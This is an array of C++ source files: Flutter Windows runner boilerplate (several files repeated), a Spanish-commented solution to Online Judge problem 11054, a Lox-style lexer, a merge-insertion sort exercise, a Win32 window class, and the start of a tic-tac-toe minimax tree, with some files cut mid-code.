    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// Parcial 2 Estructuras de Datos y Algoritmos 2:\n// Problema de Online Judge 11054 - Wine trading in Gergovia.\n// Todos los habitantes son vendedores de vino y le compran vino a otros y cada dia deciden cuanto vino quiere comprar o vender.\n// La demanda y oferta son siempre iguales por lo que cada habitante obtiene lo que desea.\n// Hay un problema: el transporte de una casa a otra resulta en trabajo.\n// A los habitantes no les importa a quien le compran o venden, solo les importa la cantidad de vino que se compra o vende.\n// Son lo suficientemente inteligentes como para idear una forma de intercambiar para que el trabajo necesario del transporte sea minimo.\n// Se pide:\n// Reconstruir el intercambio de un dia; asumiendo que las casas estan construidas en una sola linea recta con la misma distancia entre casas vecinas.\n// Adicionalmente, el transporte de una botella de vino de una casa a otra adyacente cuesta 1 de trabajo.\n// La entrada esta compuesta por varios casos de prueba.\n// Cada caso se compone de:\n// Una primera linea que contiene el numero de habitantes n (2 <= n <= 100000).\n// Una segunda linea que contiene n enteros a_i (-1000 <= a_i <= 1000) que representan la cantidad de vino que cada habitante desea comprar o vender. Si a_i es positivo, el habitante i desea comprar a_i botellas de vino. Si a_i es negativo, el habitante i desea vender -a_i botellas de vino.\n// Se puede asumir que la suma de todos los a_i es 0.\n// La entrada termina cuando n = 0.\n// La salida esta copuesta por:\n// Una linea para cada caso de prueba que contiene el minimo trabajo necesario para que todos los habitantes obtengan lo que desean.\n\n\n// Ejemplo:\n// Entrada:\n// 5\n// 5 -4 1 -3 2\n// 0\n// Salida:\n// 9\n\n\n// Ejemplo:\n// 10\n// 100 200 300 400 500 600 700 800 900 -4500\n// 16500\n// Tenemos al vendedor y digamos que le vende 4500 al que quiere comprar 900, entonces el trabajo aca fue de 4500 y nos quedan disponibles 4500 - 900 = 3600 vinos.\n// Ahora el vendedor le vende 3600 al que quiere comprar 800, entonces el trabajo aca fue de 3600 y nos quedan disponibles 3600 - 800 = 2800 vinos.\n// Ahora el vendedor le vende 2800 al que quiere comprar 700, entonces el trabajo aca fue de 2800 y nos quedan disponibles 2800 - 700 = 2100 vinos.\n// Ahora el vendedor le vende 2100 al que quiere comprar 600, entonces el trabajo aca fue de 2100 y nos quedan disponibles 2100 - 600 = 1500 vinos.\n// Ahora el vendedor le vende 1500 al que quiere comprar 500, entonces el trabajo aca fue de 1500 y nos quedan disponibles 1500 - 500 = 1000 vinos.\n// Ahora el vendedor le vende 1000 al que quiere comprar 400, entonces el trabajo aca fue de 1000 y nos quedan disponibles 1000 - 400 = 600 vinos.\n// Ahora el vendedor le vende 600 al que quiere comprar 300, entonces el trabajo aca fue de 600 y nos quedan disponibles 600 - 300 = 300 vinos.\n// Ahora el vendedor le vende 300 al que quiere comprar 200, entonces el trabajo aca fue de 300 y nos quedan disponibles 300 - 200 = 100 vinos.\n// Ahora el vendedor le vende 100 al que quiere comprar 100, entonces el trabajo aca fue de 100 y nos quedan disponibles 100 - 100 = 0 vinos.\n// El trabajo total seria 4500 + 3600 + 2800 + 2100 + 1500 + 1000 + 600 + 300 + 100 = 16500.\n\n\n// Algoritmo:\n// 1. Leer el numero de habitantes.\n// 2. Leer la lista de habitantes.\n// 3. Inicializar el trabajo total en 0.\n// 4. Inicializar el total de vinos en 0.\n// 5. Iterar sobre la lista de habitantes.\n// 6. Calcular el total de vinos.\n// 7. Calcular el trabajo total.\n// 8. Imprimir el trabajo total.\n\n\n\n#include <iostream>\n#include <vector>\n#include <cmath>\nusing namespace std;\n\nint leer_habitantes (){\n    int num_habitantes;\n    cin >> num_habitantes;\n    return num_habitantes;\n}\n\nvector<int> crear_lista_habitantes (int num_habitantes) {\n    vector<int> habitantes;\n    habitantes.resize(num_habitantes);\n    for (int i = 0; i < num_habitantes; i++) {\n        cin >> habitantes[i];\n    }\n    return habitantes;\n}\n\nlong long calcular_trabajo_total (vector<int> habitantes) {\n    long long trabajo_total = 0;\n    long long total_vinos = 0;\n    for (int i = 0; i < habitantes.size(); i++) {\n        total_vinos += habitantes[i];\n        trabajo_total += abs(total_vinos);\n    }\n    return trabajo_total;\n}\n\nint main() {\n    int num_habitantes = leer_habitantes();\n    while (num_habitantes != 0) {\n        vector<int> habitantes = crear_lista_habitantes(num_habitantes);\n        long long trabajo_total = calcular_trabajo_total(habitantes);\n        cout << trabajo_total << endl;\n        num_habitantes = leer_habitantes();\n    }\n\n\nreturn 0;\n}\n\n\n\n",
    "#include \"lex.h\"\n#include <cctype>\n\nvoid error(int line, std::string message);\n\nstd::map<std::string, TokenType> Lexer::keywords =\n{\n    {\"and\",     AND},\n    {\"class\",   CLASS},\n    {\"else\",    ELSE},\n    {\"false\",   FALSE},\n    {\"for\",     FOR},\n    {\"fun\",     FUN},\n    {\"if\",      IF},\n    {\"nil\",     NIL},\n    {\"or\",      OR},\n    {\"print\",   PRINT},\n    {\"return\",  RETURN},\n    {\"super\",   SUPER},\n    {\"this\",    THIS},\n    {\"true\",    TRUE},\n    {\"var\",     VAR},\n    {\"while\",   WHILE},\n};\n\nconst std::vector<Token>& Lexer::scan_tokens()\n{\n    while (!is_at_end()) {\n      this->m_start = this->m_current;\n      scan_token();\n    }\n\n    this->m_tokens.emplace_back(END, \"\", \"\", this->m_line);\n    return this->m_tokens;\n}\n\nvoid Lexer::scan_token()\n{\n    char c = advance();\n    switch (c) {\n        case '(': this->add_token(LEFT_PAREN); break;\n        case ')': this->add_token(RIGHT_PAREN); break;\n        case '{': this->add_token(LEFT_BRACE); break;\n        case '}': this->add_token(RIGHT_BRACE); break;\n        case ',': this->add_token(COMMA); break;\n        case '.': this->add_token(DOT); break;\n        case '-': this->add_token(MINUS); break;\n        case '+': this->add_token(PLUS); break;\n        case ';': this->add_token(SEMICOLON); break;\n        case '*': this->add_token(STAR); break; \n        case '!':\n          this->add_token(match('=') ? BANG_EQUAL : BANG);\n          break;\n        case '=':\n          this->add_token(match('=') ? EQUAL_EQUAL : EQUAL);\n          break;\n        case '<':\n          this->add_token(match('=') ? LESS_EQUAL : LESS);\n          break;\n        case '>':\n          this->add_token(match('=') ? GREATER_EQUAL : GREATER);\n          break;  \n        case '/':\n            if (this->match('/'))\n              while (this->peek() != '\\n' && !this->is_at_end()) \n                  this->advance();\n            else\n              this->add_token(SLASH);\n          break;\n        case ' ':\n        case '\\r':\n        case '\\t':\n          break;\n        case '\\n':\n          this->m_line++;\n          break;\n        case '\"': this->string(); break;\n        case 'o':\n            if (match('r'))\n              add_token(OR);\n  break;\n        default:\n            if (isdigit(c))\n                number();\n            else if (isalpha(c))\n                identifier();\n            else\n                error(this->m_line, \"Unexpected character.\");\n        break;\n    }\n}\n\nchar Lexer::advance()\n{ \n    return this->m_source.at(this->m_current++);\n}\n\nvoid Lexer::add_token(TokenType type) \n{ \n    this->add_token(type, \"\"); \n}\n\nvoid Lexer::add_token(TokenType type, std::any literal)\n{\n    std::string text = this->m_source.substr(this->m_start, this->m_current - this->m_start);\n\n    this->m_tokens.emplace_back(type, text, literal, this->m_line);\n}\n\nbool Lexer::match(char expected)\n{\n    if (is_at_end()) return false;\n    if (this->m_source.at(this->m_current) != expected) return false;\n\n    this->m_current++;\n    return true;\n}\n\nchar Lexer::peek() \n{\n    if (this->is_at_end()) return '\\0';\n    return this->m_source.at(this->m_current);\n}\n\nvoid Lexer::string()\n{\n    while (this->peek() != '\"' && !this->is_at_end()) {\n      if (this->peek() == '\\n') \n        this->m_line++;\n      \n      this->advance();\n    }\n\n    if (this->is_at_end()) {\n      error(this->m_line, \"unterminated string.\");\n      return;\n    }\n\n    this->advance();\n\n    std::string value = this->m_source.substr(this->m_start + 1, this->m_current - this->m_start -1);\n    this->add_token(STRING, value);\n}\n\nvoid Lexer::number() \n{\n    while (isdigit(this->peek())) \n        this->advance();\n\n    if (this->peek() == '.' && isdigit(this->peek_next())) {\n      this->advance();\n\n      while(isdigit(peek())) \n        this->advance();\n    }\n\n    add_token(NUMBER, stod(m_source.substr(this->m_start, this->m_current - this->m_start)));\n}\n\nchar Lexer::peek_next()\n{\n    if (this->m_current + 1 >= this->m_source.length()) \n        return '\\0';\n\n    return this->m_source.at(this->m_current + 1);\n} \n\nvoid Lexer::identifier()\n{\n    while (isalnum(this->peek())) \n        this->advance();\n\n    std::string text = this->m_source.substr(this->m_start, this->m_current - this->m_start);\n\n    TokenType type;\n    if(Lexer::keywords.find(text) == Lexer::keywords.end())\n        type = IDENTIFIER;\n    else\n        type = Lexer::keywords[text];\n\n    add_token(type);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"PmergeMe.hpp\"\n#include <iostream>\n#include <algorithm>\n#include <sstream>\n\nPmergeMe::PmergeMe() {}\n\nPmergeMe::PmergeMe(const PmergeMe& other) {(void)other;}\n\nPmergeMe::~PmergeMe() {}\n\nPmergeMe& PmergeMe::operator=(const PmergeMe& other) {\n\t(void)other;\n    return *this;\n}\n\nvoid PmergeMe::mergeInsertionSortWithVector(std::vector<int>& v, int p, int r, int k) {\n    if (r - p + 1 <= k) {\n        std::sort(v.begin() + p, v.begin() + r + 1);\n    } else {\n        int q = (p + r) / 2;\n\t\tmergeInsertionSortWithVector(v, p, q, k);\n\t\tmergeInsertionSortWithVector(v, q + 1, r, k);\n\t\tstd::inplace_merge(v.begin() + p, v.begin() + q + 1, v.begin() + r + 1);\n    }\n}\n\nvoid PmergeMe::mergeInsertionSortWithList(std::list<int> &l, int p, int r, int k)\n{\n\tif (r - p + 1 <= k) {\n\t\tl.sort();\n\t}\n\telse {\n\t\tint q = (p + r) / 2;\n\t\tstd::list<int> left(l.begin(), std::next(l.begin(), q - p + 1));\n\t\tstd::list<int> right(std::next(l.begin(), q - p + 1), l.end());\n\t\tmergeInsertionSortWithList(left, p, q, k);\n\t\tmergeInsertionSortWithList(right, q + 1, r, k);\n\t\tl.clear();\n\t\tl.merge(left);\n\t\tl.merge(right);\n\t}\n}\n\nvoid PmergeMe::readData(std::vector<int>& v, char** argv) {\n    while (*argv) {\n        std::istringstream iss(*argv);\n        int data;\n        while (iss >> data) {\n            v.push_back(data);\n        }\n        ++argv;\n    }\n}\n\nvoid PmergeMe::writeData(const std::vector<int>& v) const {\n    for (size_t i = 0; i < v.size(); ++i) {\n        std::cout << v[i] << \" \";\n    }\n\tstd::cout << std::endl;\n}\n\nvoid PmergeMe::readData(std::list<int>& l, char** argv) {\n\twhile (*argv) {\n\t\tstd::string str = *argv;\n\t\tstd::istringstream iss(str);\n\t\tint data;\n\t\twhile (iss >> data) {\n\t\t\tl.push_back(data);\n\t\t}\n\t\t++argv;\n\t}\n}\n\nvoid PmergeMe::writeData(const std::list<int>& l) const {\n\tfor (std::list<int>::const_iterator it = l.begin(); it != l.end(); ++it) {\n\t\tstd::cout << *it << \" \";\n\t}\n\tstd::cout << std::endl;\n}",
    "#include \"stdafx.h\"\n#include \"..\\Diagnostics\\Debugging.h\"\n\n#include \"Window.h\"\n\nHWND CWindow::s_mCurrentViewWnd;\n\n//----------------------------------------------------------------------------------------------\nvoid CWindow::Initialize(WNDPROC WindowProc, HINSTANCE Instance, int CmdShow, LPCWSTR pName, LPCWSTR pDesc, int Width, int Height)\n{\n    // Register class\n    WNDCLASSEX wcex;\n    wcex.cbSize = sizeof( WNDCLASSEX );\n    wcex.style = CS_HREDRAW | CS_VREDRAW;\n    wcex.lpfnWndProc = WindowProc;\n    wcex.cbClsExtra = 0;\n    wcex.cbWndExtra = 0;\n    wcex.hInstance = Instance;\n    wcex.hIcon = 0;\n    wcex.hCursor = LoadCursor( NULL, IDC_ARROW );\n    wcex.hbrBackground = ( HBRUSH )( COLOR_WINDOW + 1 );\n    wcex.lpszMenuName = NULL;\n    wcex.lpszClassName = pName;\n    wcex.hIconSm = 0;\n    WORD Res = RegisterClassEx( &wcex );\n\tAssert(Res);\n\n    // Create window\n    m_Inst = Instance;\n    RECT rc = { 0, 0, Width, Height };\n    AdjustWindowRect( &rc, WS_OVERLAPPEDWINDOW, FALSE );\n    m_Wnd = CreateWindow( pName, pDesc, WS_OVERLAPPEDWINDOW,\n                           CW_USEDEFAULT, CW_USEDEFAULT, rc.right - rc.left, rc.bottom - rc.top, NULL, NULL, Instance,\n                           NULL );\n\tAssert(m_Wnd);\n    ShowWindow(m_Wnd, CmdShow );\t\n    UpdateWindow(m_Wnd);\n}\n\n//----------------------------------------------------------------------------------------------\nHWND CWindow::GetWnd()\n{\n\treturn m_Wnd;\n}\n\n//----------------------------------------------------------------------------------------------\nCWindow::CWindow()\n{\n\tm_Wnd = 0;\n\tm_Inst = 0;\n}\n\n//----------------------------------------------------------------------------------------------\nCWindow::~CWindow()\n{\n}\n\n//----------------------------------------------------------------------------------------------\nvoid CWindow::SetCurrentViewWnd(HWND Wnd)\n{\n\ts_mCurrentViewWnd = Wnd;\n}\n\nHWND CWindow::GetCurrentViewWnd()\n{\n    return s_mCurrentViewWnd;\n}\n\n//----------------------------------------------------------------------------------------------\nbool CWindow::IsMouseCursorInCurrentView()\n{\n\tif(GetFocus() != s_mCurrentViewWnd)\n\t\treturn false;\n    WINDOWINFO Wi = {};\n\tPOINT CursorPos;\n    GetCursorPos(&CursorPos);        \n\tGetWindowInfo(s_mCurrentViewWnd, &Wi);\n\treturn (CursorPos.x > Wi.rcClient.left) && (CursorPos.x < Wi.rcClient.right) && (CursorPos.y > Wi.rcClient.top) && (CursorPos.y < Wi.rcClient.bottom);\n}",
    "// #include <GL/freeglut.h>\n\n#include <algorithm>\n#include <iostream>\n#include <vector>\nusing namespace std;\nvector<vector<vector<int>>> generatePossibleMoves(vector<vector<int>> board,\n                                                  int player) {\n  vector<vector<vector<int>>> possibleMoves;\n  for (int i = 0; i < board.size(); i++) {\n    for (int j = 0; j < board[i].size(); j++) {\n      if (board[i][j] == 0) {  // Si la casilla est\u00e1 vac\u00eda\n        vector<vector<int>> newBoard = board;\n        newBoard[i][j] = player;  // Colocar la ficha del jugador en la casilla\n        possibleMoves.push_back(newBoard);\n      }\n    }\n  }\n  return possibleMoves;\n}\nstruct Node {\n  vector<vector<int>> board;\n  int value;\n  vector<Node*> children;\n};\n\nint calculatePossibilities(std::vector<std::vector<int>> board, int player) {\n  int possibilities = 0;\n  // Check rows\n  for (int i = 0; i < 3; i++) {\n    if (board[i][0] == player && board[i][1] == player && board[i][2] == 0)\n      possibilities++;\n    if (board[i][0] == player && board[i][2] == player && board[i][1] == 0)\n      possibilities++;\n    if (board[i][1] == player && board[i][2] == player && board[i][0] == 0)\n      possibilities++;\n  }\n  // Check columns\n  for (int i = 0; i < 3; i++) {\n    if (board[0][i] == player && board[1][i] == player && board[2][i] == 0)\n      possibilities++;\n    if (board[0][i] == player && board[2][i] == player && board[1][i] == 0)\n      possibilities++;\n    if (board[1][i] == player && board[2][i] == player && board[0][i] == 0)\n      possibilities++;\n  }\n  // Check diagonals\n  if (board[0][0] == player && board[1][1] == player && board[2][2] == 0)\n    possibilities++;\n  if (board[0][0] == player && board[2][2] == player && board[1][1] == 0)\n    possibilities++;\n  if (board[1][1] == player && board[2][2] == player && board[0][0] == 0)\n    possibilities++;\n  if (board[0][2] == player && board[1][1] == player && board[2][0] == 0)\n    possibilities++;\n  if (board[0][2] == player && board[2][0] == player && board[1][1] == 0)\n    possibilities++;\n  if (board[1][1] == player && board[2][0] == player && board[0][2] == 0)\n    possibilities++;\n  return possibilities;\n}\n\nNode* createBinaryTree(vector<vector<int>> board, int player, int depth) {\n  Node* node = new Node();\n  node->board = board;\n  node->value =\n      calculatePossibilities(board, 1) - calculatePossibilities(board, 2);\n  if (depth > 0) {\n    // Generar todas las posibles jugadas y crear nodos hijos\n    vector<vector<vector<int>>> possibleMoves =\n        generatePossibleMoves(board, player);\n    for (const auto& move : possibleMoves) {\n      Node* childNode = 